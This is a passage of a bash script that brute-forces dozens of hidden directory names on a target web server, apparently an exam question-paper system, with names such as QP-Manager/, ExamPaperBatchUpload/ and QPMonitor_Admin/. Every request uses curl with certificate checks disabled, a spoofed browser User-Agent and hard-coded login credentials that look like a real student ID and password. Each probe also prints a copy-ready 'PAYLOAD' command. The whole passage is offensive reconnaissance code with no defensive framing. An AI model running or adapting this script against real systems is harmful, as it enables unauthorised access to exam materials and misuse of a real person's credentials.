payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperBatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperBatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperBatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-DataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-DataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-DataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-ProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-ProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-ProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_ProcessingSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_ProcessingSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_ProcessingSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_DataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_DataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_DataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Dashboard/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Dashboard/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Dashboard/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Suite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Suite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Suite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminDataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminDataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminDataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Automation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Automation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Automation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-MassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-MassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-MassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-Q_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-Q_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-Q_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_TestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_TestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_TestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-Q_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-Q_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-Q_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlBatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlBatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlBatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileMonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileMonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileMonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-DataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-DataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
